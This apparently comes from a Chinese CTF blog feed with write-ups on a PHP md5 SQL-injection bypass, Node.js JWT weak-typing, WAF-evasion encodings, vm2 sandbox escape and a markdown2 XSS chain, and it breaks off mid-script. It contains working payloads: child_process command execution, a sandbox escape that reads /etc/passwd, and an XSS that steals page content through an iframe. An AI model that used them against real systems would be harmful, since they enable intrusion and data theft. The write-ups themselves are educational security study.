id="md5-raw-output-true"><a href="#md5-raw-output-true" class="headerlink" title="md5 raw_output = true"></a>md5 raw_output = true</h2><p>这其实是一个很经典的漏洞 =&gt; 如果提到 ffifdyop应该就很熟悉了。传说中的万能密码绕过。 而之所以存在这个绕过的原因是md5这个函数第二个选项就是<code>raw_output</code>。默认为false。但是假如设为true的话MD5报文摘要将以16字节长度的原始二进制格式返回。这样就会存在一些奇怪的字符。因此 ffifdyop 在经过md5后的内容恰好是<code>&#39;or&#39;6\xc9]\x99</code>.符合万能密码的要求。</p><p>本题也是同样的道理。<code>addslashes</code>看似不能绕过。但是因为拼接的是md5后的pass.所以只要找到一个数字md5后的raw内容包含<code>\</code>即可。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D; OR 1&#x3D;1#&amp;passwd&#x3D;128</span><br></pre></td></tr></table></figure><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>时隔两个月终于又把auditlabs的坑填完了…… 不得不说里面涵盖的很多php相关漏洞都是些新手刚刚入门平台里的那些经典题目的原理。当初有的半懂不懂，现在算是把坑给填上了。</p><p>然后自己最近有些纠结。原本因为接触了一些国际赛后，开始投身nodejs与python相关的漏洞了。出了几道题也都只是node跟python.唯一一道php还是sql注入。可能自己心里对php还是谈不上喜欢吧，没有钻研细节的劲头，更没有进行相关开发的想法。但最近头一次实战发现php仍旧是网站大头之一,并且ctf比赛中php还是有着能够难倒人的绝对水准。假如我想要继续提升实力，仍旧得在php下下不少功夫。更何况看框架的洞已经算最近的一大乐趣了233.</p><p>所以说,希望自己还是能花点时间去多看看php.找时间练练手。最后能多出几个题就好了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记-Nodejs相关</title>
      <link href="2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
      <url>2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>打算写写Node里面最近遇到的知识了。<br>主要还是跟周末的虎符有关吧。作为二队打的,学校虽如期进入线下,但是自己这次还是有点小难受。刷了这么多题了,结果碰到两道并不算擅长的Node题目。只做出来第一道题。吐血的是第二题当时很清楚肯定是Node.js沙盒逃逸，也按照大致流程构造了payload，结果就是打不通。赛后同样的payload上buu一试瞬间成功执行，心态炸裂。<br>老实说Node题也算做了不少次了,相关的漏洞除了原型链比较熟悉其他的都不怎么了解。打算近期一方面把相关的题目多看下，然后就是基础语法巩固下，并且总结几个遇到的有用的trick.</p><a id="more"></a><h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><p>Node.js使用的是javascript的语法。简单的说 Node.js 就是运行在服务端的 JavaScript。毫无疑问作为弱类型的javascript自然会把这种特性带到服务端,产生一些奇怪的效用。</p><p>简单的弱类型的例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a =<span class="number">200</span>;</span><br><span class="line"><span class="keyword">var</span> b =<span class="string">"1"</span>;</span><br><span class="line"><span class="keyword">var</span> c= a + b;</span><br><span class="line"><span class="built_in">console</span>.log(c);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2001</span></span><br></pre></td></tr></table></figure><p>字符串与数字经由一个二元运算符最后返回的是数字类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">name</span>:<span class="string">'jack'</span>&#125;</span><br><span class="line"><span class="keyword">if</span>(obj)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对象可以转化为布尔值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'hello'</span>;</span><br><span class="line">alert(<span class="keyword">typeof</span> a.fn());</span><br><span class="line">alert(a.fn());</span><br></pre></td></tr></table></figure><p>本该返回对象的函数a.fn()隐式的转换成了字符串“hello”显示.</p><p>这样就可以借由虎符第一个easy_login的题目来探讨下nodejs的弱类型了。</p><p>这道题不出意外应该是按照<a href="https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter" target="_blank" rel="noopener">https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter</a> 这个改的。原题跟此处的校验几乎一样。那我们来看看虎符这题的关键校验代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"><span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br></pre></td></tr></table></figure><p>去看原题就能学到姿势：由于sid是跟据第二个’.’的内容取出来的,如果稍微设计一下，比如令值为纯任意字母字符串，就能过那个if的判断并使secrets[sid]返回undefined.<br>这样配合上前面我们置为None的加密方式,即可在jwt.verify时成功解码。</p><p>本题跟原题有一丁点的区别：<code>!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>这段代码看似限制了我们只能传有效的数组键值即数字,但是数字字符串依旧有效</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">global.secrets=[<span class="string">'supersecretkeyyouwillneverknow'</span>,<span class="string">'2333333'</span>];</span><br><span class="line"><span class="keyword">const</span> sid=<span class="string">"00"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(sid);</span><br><span class="line"><span class="built_in">console</span>.log(global.secrets.length);</span><br><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"><span class="built_in">console</span>.log(secret);</span><br></pre></td></tr></table></figure><p>假设这是我们已经注册过2个用户的情况。现在看看执行结果<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/0.PNG" alt></p><p>没有报错。说明正如我们所料,进行&gt;或者&gt;=这两个运算符后字符串sid被转换成了数值类型即 0(number) 0&lt;1 &amp;&amp; 0&gt;=0<br>同时下面的数组键值不存在,即secrets[“00”]不存在。<br>所以这题可以注册n个用户,(至少要有一个),然后传个小于长度的数字字符串就行。</p><p>再简单一点的,直接传一个空字符串当然也是可以的。<br>空数组也是同样的道理。且数组如果传元素的话也会遵循跟上面字符串一样的转化规律<br>最后加密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">'secretid'</span>: <span class="string">"00"</span>, <span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'password'</span>: <span class="string">'123'</span>&#125;</span><br><span class="line">print(jwt.encode(payload, <span class="string">''</span>, algorithm=<span class="literal">None</span>))</span><br></pre></td></tr></table></figure><p>值得一提的是,纯字母字符串与数字比较既不满足大于等于也不满足小于等于，这也是国际赛原题的小技巧。</p><h2 id="使用编码-模板字符-数组等绕过waf"><a href="#使用编码-模板字符-数组等绕过waf" class="headerlink" title="使用编码\模板字符\数组等绕过waf"></a>使用编码\模板字符\数组等绕过waf</h2><p>Node.js在编码上也有许多可以绕过的技巧<br>常见的比如八进制,16进制,unicode</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"constructor"</span></span><br><span class="line"><span class="comment">//oct</span></span><br><span class="line"><span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span></span><br><span class="line"><span class="comment">//hex</span></span><br><span class="line"><span class="string">"\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"</span></span><br><span class="line"><span class="comment">//unicode</span></span><br><span class="line"><span class="string">"\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"</span></span><br></pre></td></tr></table></figure><p>假如想调用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(12345)&#39;)()</span><br><span class="line">[].constructor.constructor(&#39;alert(12345)&#39;)()</span><br><span class="line">Array.constructor(&#39;alert(12345)&#39;)()</span><br></pre></td></tr></table></figure><p>//上面三种写法是等价的.之前公益赛NodeGame也提到过。<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/1.PNG" alt></p><p>但是要注意一点。这里其他进制以及unicode想要成功被解析成字符串还是得要单或双引号。否则无法成功执行。那么遇到过滤了单双引号的waf怎么办呢？</p><p>这里再给出一种方法。比如这次虎符just_escape我使用的绕过waf的payload：<code>\u0065val(String.fromCharCode(116,114,121,123,10,32,32,32,32,32,32......))</code></p><p>unicode的绕过不必多说后面字符串使用String.fromCharCode也是xss中经常用到的技巧了。<br>就是这个payload在icq打不通…buu可行。不然我差点怀疑方法构造有问题了…难受</p><p>还有一种方法是从赵师傅那里学来的模板字符串的方法,其实自己之前也用过,就是没深刻理解。</p><p>简单来用就是用反引号代替双引号.所以上面说只有单双引号才能解析进制是错误的。<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/2.PNG" alt><br>但是经实验后发现,只有八进制会在被反引号嵌套时出现报错。这点暂时没找到原因,我猜测可能跟八进制过于简便的写法有关吧。<br>(js语法中只要”\143”这种写法就默认为八进制,最大为”\377”)</p><p>而模板字符串的写法允许我们进行字符拼接<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/3.PNG" alt></p><p>当然针对虎符这道题还有数组绕过的一个姿势,因为只是接受参数，然后进行waf的辨别,使用数组自然也是可行的<br>构造payload上简单了许多。其实原理跟上面弱类型的trick一样，当数组分别为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"process"</span>] <span class="comment">//waf</span></span><br><span class="line">[<span class="string">"global.process"</span>]  <span class="comment">// 绕过</span></span><br></pre></td></tr></table></figure><p>上面被waf挡住显然是因为数组的值直接提取出来与waf中过滤的每一个关键字比较。但是如果是完整的payload字符串显然不会被任何单个的waf关键字匹配到。</p><p>下面这个paypal的RCE例子也可以参考下<br><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">https://artsploit.blogspot.com/2016/08/pprce2.html</a> </p><p>关于数组绕过还有一个有趣的trick来自HackTM2020 Draw with us<br><a href="https://xz.aliyun.com/t/7177#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7177#toc-4</a><br>里面有一个点,需要获取n的值。但是n又被waf挡住了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"p"</span>, <span class="string">"n"</span>, <span class="string">"port"</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里同样可以使用数组绕过。在js中,a[[“n”]]还是被理解成a.n 所以waf匹配不到,但是这样仍旧能获取n这个键的值。</p><p><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/4.PNG" alt><br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/5.PNG" alt></p><p>所以以上几种写法应该可以解决大多数waf了。</p><h2 id="命令执行与沙盒逃逸"><a href="#命令执行与沙盒逃逸" class="headerlink" title="命令执行与沙盒逃逸"></a>命令执行与沙盒逃逸</h2><p>js里调用函数有一个自己之前一直不太懂的点终于弄明白了。</p><ul><li>IIFE</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure><p>这是IIFE（立即调用函数表达式）的写法。javascript在遇到它之后将立即执行函数。</p><p>在反序列化漏洞CVE-2017-5941 中有一处eval的拼接执行，就是用到了这个。因为eval后的语句是被括号包裹了的。其实说起来也简单。加个括号而已。然后命令在反序列化时直接触发。</p><p>然后关于命令执行的几个常见payload,比如原型链中常用的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line">global.process.mainModule.constructor._load(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line">global.process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><p>大体上就这几种执行命令的方式。其实简单说就是能获取到child_process这一步就行了。因为Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。<br>而直接require有时候是获取不到的,这点p牛也讲过了。</p><h3 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h3><p>其实沙盒逃逸的题也不时第一次做。之前HITCON也有过这样的题,Confidence上也有沙盒的题。但是这次比赛还是拉胯了。虽然是环境的问题,但要是接触多的话换payload打应该是很轻松的吧。所以还是简单接触下</p><p><a href="https://github.com/patriksimek/vm2/issues" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues</a><br>首先要找现成payload的话,直接上github上issue找就好了,有位dalao专业研究沙盒逃逸,基本上所有版本的payload都是他找的,直接issue里搜breakout即可。</p><p>然后是原理。其实就是相当于给个沙盒环境。像process这样的危险代码基本都是undefined的。所以才有了通过<code>this.constructor.constructor(&#39;return this.process.env&#39;)()</code><br>bypass的payload出现。(跟pythonssti沙盒逃逸差不多不是吗)<br>vm2相比于vm环境限制更加严格。原先通过this获取constructor的方法不再行得通。目前主流的方法主要是通过trycatch语句构造。通过try语句中报错进入到catch块,假如catch块捕捉到的错误比如是由host扔出的,就能利用不加限制的host一步步获取属性到require进而命令执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.process.removeListener(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> (host_exception) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'host exception: '</span> + host_exception.toString());</span><br><span class="line">        host_constructor = host_exception.constructor.constructor;</span><br><span class="line">        host_process = host_constructor(<span class="string">'return this'</span>)().process;</span><br><span class="line">  child_process = host_process.mainModule.require(<span class="string">"child_process"</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(child_process.execSync(<span class="string">"cat /etc/passwd"</span>).toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>虎符这题则基本就是按hackim的babyjs改的。前端都几乎一样。只不过vm版本换成了3.8.3…所以搜下issue就行了。bypass用上面总结的方法都可以。</p><p>关于沙盒逃逸的一些细节我也是不太懂。打算过段时间把国际赛上js沙盒逃逸的题补一下。目前的套路简单有：<br><code>Error().stack</code><br>使用此命令可以爆出stack strace.相当于是一个FUZZ手段了.爆出错误信息如vm.js或者vm2.js就可以去收集对应的payload了。</p><p>日后再碰到沙盒逃逸的题也会放到文章里总结。希望自己能尽快上手Node.js吧。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184</a><br><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteBanditsCTF2020两道WEB复现</title>
      <link href="2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>这周末又当了波国际赛划水懒狗。看了几个比赛难度参差不齐。只有bytebandits的难度确实顶。当时看了下NotesApp没做出来就划水去了。所幸官方很贴心的给了docker的环境。现在把两道WEB复现下,都是很有价值的题目。</p><a id="more"></a><h2 id="NotesAPP"><a href="#NotesAPP" class="headerlink" title="NotesAPP"></a>NotesAPP</h2><p>这题复现的话有一个问题,就是要改下源码。一个是改bot的访问地址。再一个就是因为里面用了Googlecaptchakey,所以得换。但是我给自己的vps申请的key换了后还是不顶用。索性把相关的html跟python代码删掉了,姑且是能做了hhh.</p><p>首先题目给了源码。现在可以到官方github上看<a href="https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes" target="_blank" rel="noopener">https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes</a></p><p>简单审计后首先注意到一个markdown xss</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/profile")</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"profile.html"</span>, current_user = current_user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/update_notes", methods=["POST"])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_notes</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.id == <span class="string">'admin'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Nope."</span></span><br><span class="line">    <span class="comment"># markdown support!!</span></span><br><span class="line">    current_user.notes = markdown2.markdown(request.form.get(<span class="string">'notes'</span>), safe_mode = <span class="literal">True</span>)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/profile"</span>)</span><br></pre></td></tr></table></figure><p>登录进去后在/profile路由即可updatemarkdown内容。这里自然想到markdownxss。不过当时尝试了下并没有打出来。<br>因为这里用到的是markdown2这个库的safe_mode。html标签都会直接转义。<br>后来发现用到的是github上的一个issue.<br><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a><br>safe_mode或者escape都有对应的xsspayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;alert(1);&#x2F;\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/0.PNG" alt><br>得到一个self-xss.</p><p>得到self-xss的第一步就是应该考虑如何提升xss的危害性。因为我们的题目还有一处<code>/send_link</code>路由明显是提交url后让bot进行访问。那么这里可能需要考虑csrf。<br>因为只有admin登录访问profile会得到flag。我们访问自己的profile只能得到自己的内容。<br>传统的CSRF一定是遵循以下原则的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.登录受信任网站A，并在本地生成Cookie。</span><br><span class="line">2.在不登出A的情况下，访问危险网站B。</span><br></pre></td></tr></table></figure><p>那么基于此题bot的存在,我们大概的流程是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.让bot访问profile,此时存在flag</span><br><span class="line">2.logout</span><br><span class="line">3.登录构造好payload的用户，并加载payload.得到admin的信息</span><br></pre></td></tr></table></figure><p>但是存在几个细节：<br>如何控制bot登出并登录？<br>如何让我们的payload能够得到admin页面的信息？</p><p>仔细观察发现一个细节。当我们注册时,用户名与密码通过post方式请求。但是当我们登出再登录时，却是通过get请求进行登录。<br>因此先登出再登录的细节就解决了。<br>至于加载admin的信息，使用到的自然是经典的iframe xss 。原来总结CSP时用过。经典的利用就是：<br>一个同源页面，一个是CSP保护的flag页面A，一个是存在xss的页面B。只需要一个iframe就能窃取到flag.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iframe.src=<span class="string">"A页面"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'flag'</span>).innerHTML),<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>此题并没有对iframe的限制。自然是可行的</p><p>所以构思后我们的payload应该是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.提交url,让bot访问我们vps上的内容</span><br><span class="line">2.先加载一个iframe去访问profile并登出</span><br><span class="line">3.再加载一个iframe，通过url直接登录我们自建账号。触发payload</span><br></pre></td></tr></table></figure><p>然而这题有个坑 注意到visit_link.py中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"><span class="keyword">from</span> rq <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> psutil, signal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url)</span>:</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch(headless=<span class="literal">True</span>,</span><br><span class="line">                           executablePath=<span class="string">"/usr/bin/chromium-browser"</span>,</span><br><span class="line">                           args=[<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-gpu'</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">        <span class="keyword">await</span> page.goto(<span class="string">"https://notes.web.byteband.it/login"</span>)</span><br><span class="line">        <span class="keyword">await</span> page.type(<span class="string">"input[name='username']"</span>, <span class="string">"admin"</span>)</span><br><span class="line">        <span class="keyword">await</span> page.type(<span class="string">"input[name='password']"</span>, os.environ.get(<span class="string">"ADMIN_PASS"</span>))</span><br><span class="line">        <span class="keyword">await</span> asyncio.wait([</span><br><span class="line">            page.click(<span class="string">'button'</span>),</span><br><span class="line">            page.waitForNavigation(),</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">        newPage = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">        <span class="keyword">await</span> newPage.goto(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main(url))</span><br><span class="line"></span><br><span class="line">q = Queue(connection=Redis(host=<span class="string">'redis'</span>))</span><br></pre></td></tr></table></figure><p>这串异步代码让admin只要访问了后立即退出。也就是说我们的payload并不会有时间触发。</p><p>因此需要额外设计，比如起一个flask控制bot访问时进行停顿，这样就有时间触发payload了。<br>下面是dalao的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 